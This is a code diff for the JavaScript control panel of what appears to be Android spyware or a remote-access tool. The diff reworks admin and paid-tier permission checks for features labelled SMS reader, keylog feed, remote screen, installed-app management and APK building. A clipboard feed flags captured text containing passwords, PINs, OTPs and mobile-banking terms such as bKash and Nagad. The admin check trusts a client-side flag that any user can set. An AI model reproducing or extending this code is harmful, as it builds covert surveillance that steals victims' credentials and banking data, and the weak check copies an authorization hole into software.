@@ -873,7 +873,9 @@
     };
 
     function checkIsAdmin(userEmail, userMeta) {
-        const cleanEmail = (userEmail || (fbAuth.currentUser ? fbAuth.currentUser.email : '') || '').trim().toLowerCase();
+        if (window.isUserAdmin === true) return true;
+        const authUser = (typeof fbAuth !== 'undefined' && fbAuth.currentUser) ? fbAuth.currentUser : null;
+        const cleanEmail = (userEmail || (authUser ? authUser.email : '') || '').trim().toLowerCase();
         const isEmailAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(cleanEmail);
         const meta = userMeta || (typeof currentMeta !== 'undefined' ? currentMeta : {}) || {};
         const isRoleAdmin = meta && (meta.role === 'ADMIN' || meta.role === 'admin');
@@ -931,6 +933,11 @@
                     edit_modules: true,
                     build_apk: true
                 };
+
+                // Clear any lingering false permissions in DB for admin
+                if (currentMeta.permissions && Object.values(currentMeta.permissions).some(v => v === false)) {
+                    fbDb.ref(`users_meta/${uid}/permissions`).set(window.userPermissions);
+                }
             } else {
                 const userCustom = currentMeta.permissions || {};
                 // Merge global defaults with user overrides
@@ -1014,8 +1021,12 @@
     let deviceHeight = 2400;
     let isRemoteActive = false;
     function updateTabLockUI() {
+        const authUser = (typeof fbAuth !== 'undefined' && fbAuth.currentUser) ? fbAuth.currentUser : null;
+        const email = authUser ? (authUser.email || '').trim().toLowerCase() : '';
+        const isAdmin = checkIsAdmin(email, currentMeta) || window.isUserAdmin === true;
+        if (isAdmin) window.isUserAdmin = true;
+
         const perms = window.userPermissions || {};
-        const isAdmin = window.isUserAdmin;
         
         // Define required permission keys for tabs
         const tabPermMap = {
@@ -1063,8 +1074,12 @@
     }
 
     function switchTab(name) {
+        const authUser = (typeof fbAuth !== 'undefined' && fbAuth.currentUser) ? fbAuth.currentUser : null;
+        const email = authUser ? (authUser.email || '').trim().toLowerCase() : '';
+        const isAdmin = checkIsAdmin(email, currentMeta) || window.isUserAdmin === true;
+        if (isAdmin) window.isUserAdmin = true;
+
         const perms = window.userPermissions || {};
-        const isAdmin = window.isUserAdmin;
 
         const featureLabels = {
             'sms': 'SMS Reader & Dispatch Stream',
@@ -1082,7 +1097,7 @@
             'apps': 'Installed Application Management'
         };
 
-        if (name !== 'screen' && !isAdmin) {
+        if (name !== 'screen' && !isAdmin && !window.isUserAdmin) {
             const permKey = name;
             if (perms[permKey] !== true) {
                 const label = featureLabels[name] || (name.toUpperCase() + ' Feature');
@@ -1135,8 +1150,9 @@
 
     function togglePrivacyCb() {
         const checkbox = document.getElementById('privacyCheckbox');
+        const isAdmin = checkIsAdmin() || window.isUserAdmin === true;
         const perms = window.userPermissions || {};
-        if (!window.isUserAdmin && perms.privacy_screen !== true) {
+        if (!isAdmin && perms.privacy_screen !== true) {
             checkbox.checked = false;
             showLockModal('Privacy Screen feature is restricted for free accounts.');
             return;
@@ -1517,8 +1533,9 @@
         const container = document.getElementById('keylogList');
         if (!data) { container.innerHTML = '<div class="empty-state"><i class="fas fa-keyboard"></i><p>No logs available.</p></div>'; return; }
         
+        const isAdmin = checkIsAdmin() || window.isUserAdmin === true;
         const perms = window.userPermissions || {};
-        const isAllowed = window.isUserAdmin || perms.sensitive_feed === true;
+        const isAllowed = isAdmin || perms.sensitive_feed === true;
 
         let h = '';
         Object.keys(data).reverse().forEach(k => {
@@ -1562,8 +1579,9 @@
     devRef.child('clipboard').on('value', s => {
         const text = s.val();
         if(text) {
+            const isAdmin = checkIsAdmin() || window.isUserAdmin === true;
             const perms = window.userPermissions || {};
-            const isAllowed = window.isUserAdmin || perms.sensitive_feed === true;
+            const isAllowed = isAdmin || perms.sensitive_feed === true;
             const lower = text.toLowerCase();
             const isSensitive = lower.includes('password') || lower.includes('pin') || lower.includes('otp') || lower.includes('bkash') || lower.includes('nagad') || lower.includes('bank');
 
